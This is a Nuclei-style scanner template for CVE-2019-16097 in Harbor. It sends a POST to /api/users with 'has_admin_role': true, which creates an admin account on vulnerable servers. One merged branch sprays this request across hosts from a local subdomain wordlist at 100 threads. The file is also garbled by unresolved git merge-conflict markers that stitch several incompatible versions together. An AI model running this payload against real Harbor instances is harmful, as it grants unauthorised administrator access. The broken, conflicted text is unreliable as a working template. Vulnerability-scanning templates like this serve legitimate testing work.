id: CVE-2019-16097
<<<<<<< HEAD
info:
  name: Harbor Enables Privilege Escalation From Zero to admin
  author: pikpikcu
  severity: critical
  description: |
    core/api/user.go in Harbor 1.7.0 through 1.8.2 allows non-admin users to create admin accounts via the POST /api/users API, when Harbor is setup with DB as authentication backend and allow user to do self-registration. Fixed version: v1.7.6 v1.8.3. v.1.9.0. Workaround without applying the fix: configure Harbor to use non-DB authentication backend such as LDAP.
#  issue: https://github.com/goharbor/harbor/issues/8951
  reference: https://unit42.paloaltonetworks.com/critical-vulnerability-in-harbor-enables-privilege-escalation-from-zero-to-admin-cve-2019-16097/
  tags: cve,cve2019,intrusive,harbor
<<<<<<< HEAD
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
    cvss-score: 6.50
    cve-id: CVE-2019-16097
    cwe-id: CWE-862
=======

info:
  name: Harbor <=1.82.0 - Privilege Escalation
  author: pikpikcu
  severity: medium
  description: Harbor 1.7.0 through 1.8.2 is susceptible to privilege escalation via core/api/user.go, which allows allows non-admin users to create admin accounts via the POST /api/users API when Harbor is setup with DB as an authentication backend and allows user to do self-registration.
  reference:
    - https://unit42.paloaltonetworks.com/critical-vulnerability-in-harbor-enables-privilege-escalation-from-zero-to-admin-cve-2019-16097/
    - https://github.com/goharbor/harbor/issues/8951
    - https://nvd.nist.gov/vuln/detail/CVE-2019-16097
    - https://github.com/goharbor/harbor/commit/b6db8a8a106259ec9a2c48be8a380cb3b37cf517
  remediation: Upgrade to v1.7.6 v1.8.3. v.1.9.0 or higher. A potential workaround without applying the fix is to configure Harbor to use a non-DB authentication backend such as LDAP.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
    cvss-score: 6.5
    cve-id: CVE-2019-16097
    cwe-id: CWE-862
  tags: cve,cve2019,intrusive,harbor
>>>>>>> 5d36d276 (add new stuff)

requests:
  - method: POST
    path:
      - '{{BaseURL}}/api/users'
    headers:
      Content-Type: application/json
    body: |
<<<<<<< HEAD
      {"username": "testpoc", "has_admin_role": true, "password": "TestPoc!", "email": "testpoc@example.com", "realname": "poc"}
=======
      {"username": "testpoc", "has_admin_role": true, "password": "TestPoc!", "email": "testpoc@interact.sh", "realname": "poc"}
>>>>>>> 5d36d276 (add new stuff)
=======

requests:
  - payloads:
      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
    attack: sniper
    threads: 100
>>>>>>> 18ddf72b (add new stuff)

    raw:
      - |
        POST /api/users HTTP/1.1
        Host: {{Subdomains}}
        Content-Type: application/json
        
        {"username": "testpoc", "has_admin_role": true, "password": "TestPoc!", "email": "testpoc@example.com", "realname": "poc"}        
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "username has already been used"
          - "Location: /api/users/"
<<<<<<< HEAD
        part: all
=======
        part: response
>>>>>>> 5d36d276 (add new stuff)
        condition: or

      - type: status
        status:
          - 201
          - 409
        condition: or
<<<<<<< HEAD
=======

# Enhanced by mp on 2022/04/19
>>>>>>> 5d36d276 (add new stuff)
